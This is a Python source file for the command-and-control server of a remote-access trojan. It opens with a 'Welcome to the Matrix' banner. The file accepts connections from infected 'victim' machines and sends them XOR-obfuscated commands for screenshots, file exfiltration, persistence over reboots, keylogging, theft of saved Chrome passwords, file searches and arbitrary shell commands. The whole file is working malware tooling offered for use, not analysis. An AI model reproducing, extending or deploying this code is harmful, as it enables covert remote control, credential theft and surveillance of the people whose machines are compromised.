import threading
import time
import os
import socket
import random

class bcolors:

    ############################################################
    # This class contains every color used for shell font      #
    ############################################################
    
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    WHITE = '\033[97m'
    ERROR = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Messages:

    ############################################################
    # This class contains every messages the payload will use  #
    ############################################################

    def opening(self):
        os.system("clear")
        print(bcolors.GREEN + '888       888          888 888                                              888                 888    888                   888b     d888          888            d8b          ')
        print(bcolors.GREEN + '888   o   888          888 888                                              888                 888    888                   8888b   d8888          888            Y8P          ')
        print(bcolors.GREEN + '888  d8b  888          888 888                                              888                 888    888                   88888b.d88888          888                         ')
        print(bcolors.GREEN + '888 d888b 888  .d88b.  888 888  .d8888b  .d88b.  88888b.d88b.   .d88b.      888888  .d88b.      888888 88888b.   .d88b.      888Y88888P888  8888b.  888888 888d888 888 888  888 ')
        print(bcolors.GREEN + '888d88888b888 d8P  Y8b 888 888 d88P"    d88""88b 888 "888 "88b d8P  Y8b     888    d88""88b     888    888 "88b d8P  Y8b     888 Y888P 888     "88b 888    888P"   888 `Y8bd8P  ')
        print(bcolors.GREEN + '88888P Y88888 88888888 888 888 888      888  888 888  888  888 88888888     888    888  888     888    888  888 88888888     888  Y8P  888 .d888888 888    888     888   X88K   ')
        print(bcolors.GREEN + '8888P   Y8888 Y8b.     888 888 Y88b.    Y88..88P 888  888  888 Y8b.         Y88b.  Y88..88P     Y88b.  888  888 Y8b.         888   "   888 888  888 Y88b.  888     888 .d8""8b. ')
        print(bcolors.GREEN + '888P     Y888  "Y8888  888 888  "Y8888P  "Y88P"  888  888  888  "Y8888       "Y888  "Y88P"       "Y888 888  888  "Y8888      888       888 "Y888888  "Y888 888     888 888  888 ')

        print(bcolors.WHITE + '\n-=SERVER HAS BEN STARTED!=-')
        print(bcolors.WHITE + 'Lets see how deep the rabbit hole goes...\n\n')
        print(bcolors.WHITE + '[*] Awaiting for connections\n')

    def syshelp(self):
        print("\n")
        print(bcolors.GREEN + "Core Commands:\n")
        print(bcolors.WHITE + "sessions             - See all available connections")
        print(bcolors.WHITE + "connect              - Connect to one session")
        print(bcolors.WHITE + "                       Usage: connect*<SessionID>")
        print(bcolors.WHITE + "clear                - Clean the shell console\n\n")
        print(bcolors.GREEN + "Session Commands:\n")
        print(bcolors.WHITE + "screenshot           - Take a fullscreenshot from target machine")
        print(bcolors.WHITE + "grab                 - Transfer a file from the target machine")
        print(bcolors.WHITE + "                       Usage: grab*<file.exe>")
        print(bcolors.WHITE + "                              grab*<file2.jpg>")
        print(bcolors.WHITE + "startup              - Make the payload persistance over reboots")
        print(bcolors.WHITE + "chrome               - Attempt to collect all stored username/passwords in Google Chrome Browser")
        print(bcolors.WHITE + "search               - Search for specific extentions files in victim machine")
        print(bcolors.WHITE + "                       Usage: search <Dir>*<extention>")
        print(bcolors.WHITE + "                              search C:/Users*.pst")
        print(bcolors.WHITE + "goto                 - Go to other files directoryes")
        print(bcolors.WHITE + "                       Usage: goto*<direcrory>")
        print(bcolors.WHITE + "                       Usage: goto*C:/Users")
        print(bcolors.WHITE + "logging              - Start/dump/stop keylogger in victim machine")
        print(bcolors.WHITE + "                       Usage: logging*<start/dump/stop>")
        print(bcolors.WHITE + "clear                - Clean the shell console")
        print(bcolors.WHITE + "help                 - Get more info about the shell commands")
        print(bcolors.WHITE + "background           - Return so Sessions Menu but keep the session active")
        print(bcolors.WHITE + "termiante            - Finish the session")
        print("\n")

class EncryptionXor:

    #########################################################################
    # This class contains the method for encrypt data using XOR encryption  #
    #########################################################################

    def __init__(self):
        self.keyXor = '28zij6tTWYR8CMTvFM33g27NWido8Vox6T3lWGuHyLLGYMuHqV34fSDQ9hSWP6JM5XZz5YWWbgNrWANiy4pN3RoJnbUzUMENZ5U2dbNMEB4ynfl6Iolus98lZ0RPg1Cpj2SEUNlhY9MeToWNGoNYo1wXaMjEapo8ezzvdMovcaBfJdwXMv3JYDjQDh0rjeGpvLR2LlRVKBCKkxwSig16fRzU67cFzSJdscwZua118hSOROP1TRnowo7ObNRWtIrpFGxOFMYm4lqOoJ2pPzTSPZUaPApcD5wdrH4bvRq42Nh76TKINYD2bUzeAdSmoDeHBtPQr5mP7N2RRzpOQeywlEH92gMBDwF4rjF5Vv3IYyhvXE5I3tfSqxD7owG3H1z8inXDaR4uB4M0x1OXBjnE4Roi4AS5ibwnEfMRjiYkF4y70536m3OLN7QQwb08TIpKzx7CRyy8ee7kAR5K5QhvXyfFh3094Y6JRe8E9sn8LcQrpDUnM69rPrmy0I1aWcFPDEzlbnrth2KeoZRixs2CuDolHCCTGJbpUqoLBO3lnvGCAkk1DbxXMQ6kgQRQfd96LA2ILF0Mmx4GAdg3WMM26jZpCBniwgWfMtc9iUJqIvFqXNGeAFzH0tOTEUOvhzQtJjwOHuwyssPryrSHsYc11McdLYP0fRAoZG4giIbOxz03ldhXFcw7oBlRCfadjXxl6axeO93Tsj0Eoul5wRjvDI1vnpcuYytfKJ22FaErqryccZCPLMrRg8VO5EH3KQCx3TyK6rDkZMkqo6DJOjIjJGvkjBlho74ab4J3OXBhB6kduvVbZeAFdtN6PXdlVUve9DiUAGsoqWaMLwyOkJjB7FxzA4zFmGJoziO6KyCRMCk21epkQBUVwvHYfCYGKrDp7ArNd7SFEbpvSZvmUkTO8s7ANqBuFnfMU69EFYEoTRjebJ6WgwQWYo5zJkurhO7sECwUWCgePXoLX8SikQXBKrJPRrf7390XQuNCrqIWxcNODfwlVGSJCvkf47PE9Qmv'

    def convert(self, string):
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(string, self.keyXor)])

class Menus:

    ############################################################
    # This class contains all menus the payload will use       #
    ############################################################

    def __init__(self):
            self.contSession = 0        # Initial value for the Session Index
            self.contTransmission = 0   # Initial value for the Transmission Index

    # Function to listenen incomimg connections
    def mainMenu(self, hostIp, hostPort):
        s = socket.socket()
        s.bind((hostIp, hostPort))
        s.listen(50)

        while True:
            c, addr = s.accept()

            print(bcolors.GREEN + '\n[+] Got connection from', addr)

            if len(addr) > 1:
                ipAdress, port = addr                                                                                   # Split IP Adress and Port from the connection array received
                cliSessions.addSession(self.contSession, c, ipAdress, port, task.osDetection(c), task.getHostname(c))   # Add Client Session to the cliSessions Array
                self.contSession = self.contSession + 1                                                                 # Add +1 to the index counter variable

    # Function to listenen incomimg transmission
    def transferMenu(self, hostIp, hostPort):
        
        try:
            s = socket.socket()
            s.bind((hostIp, hostPort))
            s.listen(1)

            while True:
                c, addr = s.accept()

                if 'search' in tSession.name:
                    print('\n[+] Search process iniciated')

                else:
                    print('\n[+] Transfer connection iniciated')

                if len(addr) > 1:
                    ipAdress, port = addr                                               # Split IP Adress and Port from the connection array received
                    tSession.addSession(self.contTransmission, c, ipAdress, port)       # Add Transfer Session to the tSession Array
                    threading._start_new_thread(task.getFiles, (c, tSession.name))      # Create new thread for receive the file
                    self.contTransmission = self.contTransmission + 1                   # Add +1 to the index counter variable
        except:
            pass

    # Function to listenen the commands output
    def mainshell(self):
        print("\n")
        while True:

            command = input(bcolors.GREEN + "Shell> ")

            if 'sessions' in command:
                task.showSessions()

            elif 'clear' in command:
                os.system('clear')

            elif 'help' in command:
                messages.syshelp()

            elif 'connect' in command:
                inputCommand = command.split("*")
                for i in cliSessions.sessionList:
                    if i[0] == int(inputCommand[1]):
                        while True:
                            shellCommand = input(bcolors.GREEN + str(i[5]) + ">> ")

                            if 'screenshot' in shellCommand:
                                threading._start_new_thread(task.getScreenShot, (i[1], 'screenshot'))           # Iniciate thread for a screenshot take 

                            elif 'grab' in shellCommand:
                                
                                _,fileName = shellCommand.split("*")
                                tSession.grabFile(fileName)
                                threading._start_new_thread(payloadMenu.transferMenu, (hostIP, tPort))    # Start listening Transfers proccess

                                i[1].send(xor.convert(shellCommand).encode())
                                print(bcolors.BLUE + "\n[+] Grab command sended to victim machine\n")
                                time.sleep(1)

                            elif 'logging' in shellCommand:
                                i[1].send(xor.convert(shellCommand).encode())
                                print(bcolors.BLUE + "\n" + xor.convert(i[1].recv(1024).decode(errors="ignore")) + "\n")

                            elif 'chrome' in shellCommand:
                                tSession.name = "chrome"
                                threading._start_new_thread(payloadMenu.transferMenu, (hostIP, tPort))
                                i[1].send(xor.convert(shellCommand).encode())
                                print(bcolors.BLUE + "\n[+] Catch Chrome Passwords command sended to victim machine\n")

                            elif 'help' in shellCommand:
                                messages.syshelp()

                            elif 'background' in shellCommand:
                                break

                            elif 'search' in shellCommand:
                                tSession.searchFile()
                                threading._start_new_thread(payloadMenu.transferMenu, (hostIP, tPort))    # Start listening search proccess
                                threading._start_new_thread(task.searchExt, (i[1], shellCommand))         # Thread that inicate the file reception that contains the result
                                print(bcolors.BLUE + "\n[+] Search command sended to victim machine\n")

                            elif 'clear' in shellCommand:
                                os.system('clear')

                            elif 'goto' in shellCommand:
                                i[1].send(xor.convert(shellCommand).encode())
                                print(bcolors.BLUE + xor.convert(i[1].recv(1024).decode(errors="ignore")))

                            elif len(shellCommand) > 1:
                                i[1].send(xor.convert(shellCommand).encode())                                   # Command that will me interpreted by the victim shell
                                print(bcolors.WHITE + xor.convert(i[1].recv(1024).decode(errors="ignore")))                     # Print output

class SessionsCli:

    ############################################################
    # This class contains the method for client main session   #
    # That includes MainMenu and MainShell                     #
    ############################################################

    sessionList = []

    def __init__(self):
        self.idNumber = ""
        self.socket = ""
        self.ipAdress = ""
        self.port = ""

    def flush(self):
        self.idNumber = ""
        self.socket = ""
        self.ipAdress = ""
        self.port = ""

    def addSession(self, idNumber, socket, ipAdress, port, osVersion, hostname):
        actualSession = [idNumber, socket, ipAdress, port, osVersion, hostname]
        self.sessionList.append(actualSession)
        self.flush()

class SessionsTransfer:

    ############################################################
    # This class contains the method for transmission session  #
    ############################################################

    transferList = []

    def __init__(self):

        self.name = ""
        self.command = ""
        self.transferId = ""
        self.transferSocket = ""
        self.transferIp = ""
        self.transferPort = ""

    def flush(self):
        self.transferId = ""
        self.transferSocket = ""
        self.transferIp = ""
        self.transferPort = ""
        
    def searchFile(self):
        self.name = "search" + str(random.randrange(1, 999999)) + ".txt"            # Filename for the search result in host machine

    def grabFile(self, name):
        self.name = name

    def addSession(self, idNumber, socket, ipAdress, port):
        actualSession = [idNumber, socket, ipAdress, port]
        self.transferList.append(actualSession)
        self.flush()

class Operations:

    ############################################################
    # This class contains all operations the payload will use  #
    ############################################################

    # Method that try to find the Operational Sistem victim is using
    def osDetection(self, socket):

        socket.send(xor.convert('osdetection').encode())
        return xor.convert(socket.recv(1024).decode(errors="ignore"))

    # Method that try to find victim machine hostname
    def getHostname(self, socket):

        socket.send(xor.convert('gethostname').encode())

        return xor.convert(socket.recv(1024).decode(errors="ignore"))

    # Method for show every connection received
    def showSessions(self):
        print(bcolors.GREEN + "\nSessions (ID/IP/PORT): \n")

        if len(cliSessions.sessionList) == 0:
            print(bcolors.ERROR + "\nNo active sessions\n")

        else:
            print(bcolors.GREEN + "x----------------------------------------------------------------------------------------------------------------------------X")
            for i in cliSessions.sessionList:
                    print(bcolors.GREEN + "ID: " + str(i[0]) + " IP: " + str(i[2]) + " Port: " + str(i[3]) + " OS: " + str(i[4]) + " Hostname: " + str(i[5]))
            print(bcolors.GREEN + "x----------------------------------------------------------------------------------------------------------------------------X\n")

    # Method for taking a screenshot from victim machine
    def getScreenShot(self, socket, name):
        socket.send(xor.convert('getscreenshot').encode())
        savedir = name + str(random.randint(1, 9))
        f = open(savedir, 'wb')
        while True:
            bits = socket.recv(1024)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                print(bcolors.BLUE + "\n[+] Screenshot saved in: " + savedir + "\n") 
                break

            if 'Print not taken'.encode() in bits:
                print(bcolors.ERROR + "\n[-] Unable to Screenshot target machine" + "\n")
                break
            f.write(bits)

    # Method to get files from victim machine
    def getFiles(self, socket, path):
        #socket.send(xor.convert(command).encode())
        f = open(path, 'wb')
        while True:
            bits2 = socket.recv(1024)

            if bits2.endswith('DONE'.encode()):
                f.write(bits2[:-4])
                f.close()
                if 'search' in tSession.name:
                    print(bcolors.BLUE + "\n[+] Search completed")
                else:
                    print(bcolors.BLUE + "\n[+] Transfer completed")
                break
            if 'File not found'.encode() in bits2:
                print(bcolors.ERROR + "\n[-] Unable to find out the file")
                os.remove(path)
                break
            f.write(bits2)

    # Method that run searchs for especific extentions on victim machine
    def searchExt(self, socket, command):
        socket.send(xor.convert(command).encode())

messages = Messages()               # Create Messagens Instance
payloadMenu = Menus()               # Create Menus Instance
cliSessions = SessionsCli()         # Create the Client Listener Instance
tSession = SessionsTransfer()       # Create the Transmission Instance
xor = EncryptionXor()               # Create the Encryption Instance
task = Operations()                 # Create the Operation Instance

hostIP = '192.168.1.8'
mainPort = 4545
tPort = 8889


try:
    threading._start_new_thread(messages.opening, ())                           # Start program header
    threading._start_new_thread(payloadMenu.mainMenu, (hostIP, mainPort))       # Start listening Main proccess
    time.sleep(0.3)                                                             # Sleep to prevent shell input from showing before the header
    threading._start_new_thread(payloadMenu.mainshell, ())                      # Start main shell terminal
except Exception as i:  # If some problem happens to any thread
   print("Error: unable to start thread")
   print(i)
while 1:
   pass